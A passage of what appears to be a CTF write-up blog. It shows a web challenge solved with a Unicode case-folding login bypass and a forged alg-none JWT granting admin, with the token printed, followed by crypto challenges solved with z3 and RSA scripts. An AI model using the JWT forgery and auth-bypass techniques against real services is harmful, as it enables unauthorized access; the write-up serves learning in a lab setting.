</span></span><span style="display:flex;"><span>password <span style="color:#555">=</span> params<span style="color:#555">[</span><span style="color:#c30">&#39;password&#39;</span><span style="color:#555">].</span>to_s<span style="color:#555">[</span><span style="color:#f60">0</span><span style="color:#555">..</span><span style="color:#f60">20</span><span style="color:#555">]</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> user <span style="color:#555">=~</span> <span style="color:#3aa">/[A-Z]/</span> <span style="color:#000;font-weight:bold">or</span> user <span style="color:#555">==</span> <span style="color:#c30">&#39;michael&#39;</span>
</span></span><span style="display:flex;"><span>info <span style="color:#555">=</span> <span style="color:#c30">&#34;Invalid Username/Password&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">return</span> erb <span style="color:#fc3">:login</span>, <span style="color:#fc3">:locals</span> <span style="color:#555">=&gt;</span> {<span style="color:#fc3">:info</span> <span style="color:#555">=&gt;</span> info}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">elsif</span> password <span style="color:#555">==</span> <span style="color:#c30">&#34;whatever&#34;</span> <span style="color:#000;font-weight:bold">and</span> user<span style="color:#555">.</span>upcase <span style="color:#555">==</span> <span style="color:#c30">&#34;MICHAEL&#34;</span>
</span></span><span style="display:flex;"><span>set_Cookies(user)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">else</span>
</span></span><span style="display:flex;"><span>info <span style="color:#555">=</span> <span style="color:#c30">&#34;Invalid Username/Password&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">return</span> erb <span style="color:#fc3">:login</span>, <span style="color:#fc3">:locals</span> <span style="color:#555">=&gt;</span> {<span style="color:#fc3">:info</span> <span style="color:#555">=&gt;</span> info}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">end</span>
</span></span><span style="display:flex;"><span>redirect <span style="color:#c30">&#39;/&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">end</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so the requirement is, somehow, we need to login with user michael and pass whatever, but we aren&rsquo;t allowed to pass <code>michael</code>. And then, the uppercase of our user username should be <code>MICHAEL</code>.
How to achieve that? The answer is to use UNICODE. Some unicode will be converted to not-UNICODE during converting it to uppercase. In this case, I use <code>ƒ±</code> unicode, so that the username is <code>mƒ±chael</code>. The upcase result will be <code>MICHAEL</code>, so we can safely login to our website.
<p class="markdown-image">
  <img src="https://i.imgur.com/5kQmi72.png" alt=""  />
</p>
Okay now we need to get the admin privilege to find the rest of the flag. Checking the cookie, it contains jwt token, which the decrypted result is like below
<p class="markdown-image">
  <img src="https://i.imgur.com/HFoIYxr.png" alt=""  />
</p>
We can try to bypass this by changing the alg to <code>none</code> and change the <code>user</code> value to <code>admin</code>. Generating the forged jwt token, we get the second flag.
Forged jwt: <code>eyJ0eXAiOiAiSldTIiwgImFsZyI6ICJub25lIn0.eyJ1c2VyIjogImFkbWluIn0.</code>
<p class="markdown-image">
  <img src="https://i.imgur.com/g6ots03.png" alt=""  />
</p></p>
<blockquote>
<p>Flag: p_ctf{un1c0de_4nd_j3t_m4kes_fu7}</p>
</blockquote>
<h2 id="crypto">Crypto <a href="#crypto" class="anchor">#</a></h2>
<h3 id="one-try">One Try <a href="#one-try" class="anchor">#</a></h3>
<p>We were given a file like below</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.Util.number</span> <span style="color:#069;font-weight:bold">import</span> long_to_bytes,bytes_to_long
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">flag</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">assert</span> k<span style="color:#555">.</span>bit_length() <span style="color:#555">==</span> <span style="color:#f60">40</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">hide</span>():
</span></span><span style="display:flex;"><span>    p<span style="color:#555">=</span><span style="color:#f60">95237125230167487838272944166423714051165223593288401382688685829040590786990768778438234082000903807362777558583037575230881045249425322887376601259055892460702772000162982010970208724929645212521533513649369206757681770172577467721506667626730799406015091008310940052579697065207083389866466950134622798087</span>
</span></span><span style="display:flex;"><span>    q<span style="color:#555">=</span><span style="color:#f60">124379800279519757231453952571634329234726580565504345524807447690769923505626825913853213968267033307369831541137813374478821479720151365039955869403139958659415082657593784893960018420207872886098820339882222586464425407525431977262528398209506069668083100281117639890041468740215875574081639292225496987247</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#366">pow</span>(bytes_to_long(flag<span style="color:#555">.</span>encode()),k,p<span style="color:#555">*</span>q)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">pad</span>(a):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> <span style="color:#366">len</span>(a) <span style="color:#555">%</span> <span style="color:#f60">32</span> <span style="color:#555">!=</span> <span style="color:#f60">0</span>:
</span></span><span style="display:flex;"><span>        a <span style="color:#555">=</span> ((<span style="color:#f60">32</span><span style="color:#555">-</span><span style="color:#366">len</span>(a) <span style="color:#555">%</span> <span style="color:#f60">32</span>)<span style="color:#555">*</span><span style="color:#366">chr</span>(<span style="color:#f60">0</span>)<span style="color:#555">.</span>encode()) <span style="color:#555">+</span> a
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">encrypt</span>(a, key<span style="color:#555">=</span>k):
</span></span><span style="display:flex;"><span>    ct <span style="color:#555">=</span> [i <span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> (pad(long_to_bytes(a)))]
</span></span><span style="display:flex;"><span>    keys<span style="color:#555">=</span>long_to_bytes(key)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> x <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">5</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">32</span>):
</span></span><span style="display:flex;"><span>            ct[i]<span style="color:#555">=</span>ct[i]<span style="color:#555">^</span>keys[<span style="color:#f60">0</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">for</span> j <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#366">len</span>(keys)):
</span></span><span style="display:flex;"><span>                ct[i] <span style="color:#555">=</span> (ct[i] <span style="color:#555">^</span> keys[j] <span style="color:#069;font-weight:bold">if</span> i <span style="color:#555">&amp;</span> <span style="color:#f60">2</span><span style="color:#555">**</span>j <span style="color:#555">!=</span> <span style="color:#f60">0</span> <span style="color:#069;font-weight:bold">else</span> ct[i])
</span></span><span style="display:flex;"><span>        keys <span style="color:#555">=</span> keys[<span style="color:#f60">1</span>:]
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> ct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#print(hide())</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#9803360482107840935986732378323704110929708112302712803731012575465683179961905078466611828488789490543493731143558620545390953556032902554822421856356533539501430684361482576102587663520949056746659748698357755897924885992782747151219465028805502494393787119343428804346092071091528754744212809617351149272272380807238804504647510591726329582179077324427249076164587445605982981728078911123292553075494650141966258672901488344682939222675606336207847496023541310374013054536034137315183694024407951884904209160042408478973616348037614424915600220818790089801126821003600059671390406058169258661700548713247796139155</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#print(encrypt(69837538996696154134353592503427759134303178119205313290251367614441787869767))</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#[153, 102, 39, 242, 39, 149, 117, 232, 221, 111, 183, 6, 70, 46, 4, 222, 85, 178, 233, 81, 4, 186, 240, 74, 238, 81, 27, 83, 14, 154, 143, 1]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading through the file, we know that we need to know the public exponent value of the RSA Encryption (which is <code>k</code>). We can derive it from the <code>encrypt</code> method. Reading through it, we can simply solve it with <code>z3</code> to retrieve our <code>k</code>. After getting the <code>k</code>, we can simply do RSA decryption to retrieve the flag. I use <code>sagemath</code> to solve it.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">z3</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.Util.number</span> <span style="color:#069;font-weight:bold">import</span> long_to_bytes,bytes_to_long
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cipher <span style="color:#555">=</span> <span style="color:#f60">9803360482107840935986732378323704110929708112302712803731012575465683179961905078466611828488789490543493731143558620545390953556032902554822421856356533539501430684361482576102587663520949056746659748698357755897924885992782747151219465028805502494393787119343428804346092071091528754744212809617351149272272380807238804504647510591726329582179077324427249076164587445605982981728078911123292553075494650141966258672901488344682939222675606336207847496023541310374013054536034137315183694024407951884904209160042408478973616348037614424915600220818790089801126821003600059671390406058169258661700548713247796139155</span>
</span></span><span style="display:flex;"><span>p <span style="color:#555">=</span> <span style="color:#f60">95237125230167487838272944166423714051165223593288401382688685829040590786990768778438234082000903807362777558583037575230881045249425322887376601259055892460702772000162982010970208724929645212521533513649369206757681770172577467721506667626730799406015091008310940052579697065207083389866466950134622798087</span>
</span></span><span style="display:flex;"><span>q <span style="color:#555">=</span> <span style="color:#f60">124379800279519757231453952571634329234726580565504345524807447690769923505626825913853213968267033307369831541137813374478821479720151365039955869403139958659415082657593784893960018420207872886098820339882222586464425407525431977262528398209506069668083100281117639890041468740215875574081639292225496987247</span>
</span></span><span style="display:flex;"><span>n <span style="color:#555">=</span> p<span style="color:#555">*</span>q
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">pad</span>(a):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> <span style="color:#366">len</span>(a) <span style="color:#555">%</span> <span style="color:#f60">32</span> <span style="color:#555">!=</span> <span style="color:#f60">0</span>:
</span></span><span style="display:flex;"><span>        a <span style="color:#555">=</span> ((<span style="color:#f60">32</span><span style="color:#555">-</span><span style="color:#366">len</span>(a) <span style="color:#555">%</span> <span style="color:#f60">32</span>)<span style="color:#555">*</span><span style="color:#366">chr</span>(<span style="color:#f60">0</span>)<span style="color:#555">.</span>encode()) <span style="color:#555">+</span> a
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>aa <span style="color:#555">=</span> BitVec(<span style="color:#c30">&#34;aa&#34;</span>, <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>b <span style="color:#555">=</span> BitVec(<span style="color:#c30">&#34;b&#34;</span>, <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>c <span style="color:#555">=</span> BitVec(<span style="color:#c30">&#34;c&#34;</span>, <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>d <span style="color:#555">=</span> BitVec(<span style="color:#c30">&#34;d&#34;</span>, <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>e <span style="color:#555">=</span> BitVec(<span style="color:#c30">&#34;e&#34;</span>, <span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>a <span style="color:#555">=</span> <span style="color:#f60">69837538996696154134353592503427759134303178119205313290251367614441787869767</span>
</span></span><span style="display:flex;"><span>res <span style="color:#555">=</span> [<span style="color:#f60">153</span>, <span style="color:#f60">102</span>, <span style="color:#f60">39</span>, <span style="color:#f60">242</span>, <span style="color:#f60">39</span>, <span style="color:#f60">149</span>, <span style="color:#f60">117</span>, <span style="color:#f60">232</span>, <span style="color:#f60">221</span>, <span style="color:#f60">111</span>, <span style="color:#f60">183</span>, <span style="color:#f60">6</span>, <span style="color:#f60">70</span>, <span style="color:#f60">46</span>, <span style="color:#f60">4</span>, <span style="color:#f60">222</span>, <span style="color:#f60">85</span>, <span style="color:#f60">178</span>, <span style="color:#f60">233</span>, <span style="color:#f60">81</span>, <span style="color:#f60">4</span>, <span style="color:#f60">186</span>, <span style="color:#f60">240</span>, <span style="color:#f60">74</span>, <span style="color:#f60">238</span>, <span style="color:#f60">81</span>, <span style="color:#f60">27</span>, <span style="color:#f60">83</span>, <span style="color:#f60">14</span>, <span style="color:#f60">154</span>, <span style="color:#f60">143</span>, <span style="color:#f60">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#555">=</span> Solver()
</span></span><span style="display:flex;"><span>ct <span style="color:#555">=</span> [i <span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> (pad(long_to_bytes(a)))]
</span></span><span style="display:flex;"><span>keys <span style="color:#555">=</span> [aa, b, c, d, e]
</span></span><span style="display:flex;"><span>starting <span style="color:#555">=</span> <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>ct <span style="color:#555">=</span> [i <span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> (pad(long_to_bytes(a)))]
</span></span><span style="display:flex;"><span>keys<span style="color:#555">=</span>[aa, b, c, d, e]
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> x <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">5</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">32</span>):
</span></span><span style="display:flex;"><span>        ct[i]<span style="color:#555">=</span>ct[i]<span style="color:#555">^^</span>keys[<span style="color:#f60">0</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">for</span> j <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#366">len</span>(keys)):
</span></span><span style="display:flex;"><span>            ct[i] <span style="color:#555">=</span> (ct[i] <span style="color:#555">^^</span> keys[j] <span style="color:#069;font-weight:bold">if</span> i <span style="color:#555">&amp;</span> <span style="color:#f60">2</span><span style="color:#555">**</span>j <span style="color:#555">!=</span> <span style="color:#f60">0</span> <span style="color:#069;font-weight:bold">else</span> ct[i])
</span></span><span style="display:flex;"><span>    keys <span style="color:#555">=</span> keys[<span style="color:#f60">1</span>:]
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#366">len</span>(res)):
</span></span><span style="display:flex;"><span>    s<span style="color:#555">.</span>add(ct[i] <span style="color:#555">==</span> <span style="color:#366">int</span>(res[i]))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> s<span style="color:#555">.</span>check() <span style="color:#555">==</span> sat:
</span></span><span style="display:flex;"><span>    model <span style="color:#555">=</span> s<span style="color:#555">.</span>model()
</span></span><span style="display:flex;"><span>    key <span style="color:#555">=</span> bytes_to_long(<span style="color:#366">bytes</span>([model[aa]<span style="color:#555">.</span>as_long(), model[b]<span style="color:#555">.</span>as_long(), model[c]<span style="color:#555">.</span>as_long(), model[d]<span style="color:#555">.</span>as_long(), model[e]<span style="color:#555">.</span>as_long()]))
</span></span><span style="display:flex;"><span>    phi <span style="color:#555">=</span> (p<span style="color:#555">-</span><span style="color:#f60">1</span>)<span style="color:#555">*</span>(q<span style="color:#555">-</span><span style="color:#f60">1</span>)
</span></span><span style="display:flex;"><span>    d <span style="color:#555">=</span> inverse_mod(key, phi)
</span></span><span style="display:flex;"><span>    m <span style="color:#555">=</span> <span style="color:#366">int</span>(<span style="color:#366">pow</span>(cipher, d, n))
</span></span><span style="display:flex;"><span>    <span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Flag: </span><span style="color:#a00">{</span>long_to_bytes(m)<span style="color:#555">.</span>decode()<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Flag: p_ctf{0ne_T1m3_Pads_are_1ns3cur5}</p>
</blockquote>
<h3 id="blind-scout">Blind Scout <a href="#blind-scout" class="anchor">#</a></h3>
<p>We were given base64 of encrypted text, and 5 pem file. I try to check whether there is common factor between the modulus of each file, and I found a common modulus between the second and the fourth pem, which mean now we can factor the second and the fourth pem. Trying to decrypt the encrypted with the second pem gave me the result.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
